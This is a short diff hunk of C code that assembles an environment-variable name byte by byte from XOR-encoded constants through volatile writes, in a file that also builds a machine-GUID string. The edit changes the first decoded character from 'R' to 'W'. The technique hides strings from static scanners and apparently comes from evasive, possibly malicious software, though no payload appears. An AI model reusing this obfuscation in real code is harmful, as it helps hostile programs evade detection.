@@ -199,7 +199,7 @@ static VOID StrMachineGuid(PCHAR buf)
 static VOID StrEnvUrl(PCHAR buf)
 {
     volatile UINT32 key = 0x4D;
-    *(volatile CHAR *)&buf[0] = (0x1F ^ key); // R
+    *(volatile CHAR *)&buf[0] = (0x1Au ^ key); // W
     *(volatile CHAR *)&buf[1] = (0x12u ^ key); // _
     *(volatile CHAR *)&buf[2] = (0x18u ^ key); // U
     *(volatile CHAR *)&buf[3] = (0x1Fu ^ key); // R
